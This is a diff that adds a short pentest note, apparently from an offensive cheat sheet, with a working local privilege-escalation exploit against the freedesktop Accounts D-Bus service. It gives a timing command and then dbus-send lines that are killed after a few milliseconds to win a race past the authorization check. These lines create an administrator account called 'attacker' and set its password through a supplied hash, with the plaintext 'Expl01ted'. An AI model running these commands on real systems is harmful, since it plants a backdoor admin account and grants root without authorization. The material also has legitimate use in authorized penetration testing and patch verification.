@@ -1,0 +1,12 @@
+- send message to the dbus and kill it directly to not allow for the check
+- exploit : 
+    - check the time needed for one request : 
+        - instruction : run the command periodically before getting a stable time
+        - command : time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+    - run the desired command and kill it in about half of the time needed for the message to run correctly : 
+        - instruction : if the time needed for one request is 10ms, the time to kill the code will be about 5ms
+        - code : 
+            - create a user : dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.002s; kill $!
+            - set password to the fresh user : dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.001s; kill $!
+            - the password : Expl01ted
+        Expl01ted
